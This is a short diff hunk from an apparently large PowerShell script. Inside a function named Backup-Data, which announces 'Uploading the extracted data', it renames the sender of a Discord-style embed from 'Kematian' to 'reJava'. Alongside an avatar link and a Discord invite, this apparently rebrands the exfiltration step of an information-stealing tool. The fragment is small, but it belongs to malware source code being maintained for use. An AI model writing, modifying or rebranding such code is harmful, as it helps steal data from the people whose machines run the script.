@@ -1099,7 +1099,7 @@ function Backup-Data {
 
     Write-Host "[!] Uploading the extracted data" -ForegroundColor Green
     $embed_and_body = @{
-        "username"    = "Kematian"
+        "username"    = "reJava"
         "color"       = "15105570"
         "avatar_url"  = "https://imgur.com/gallery/rejava-SkArr40"
         "url"         = "https://discord.gg/wDHPzKRQ"
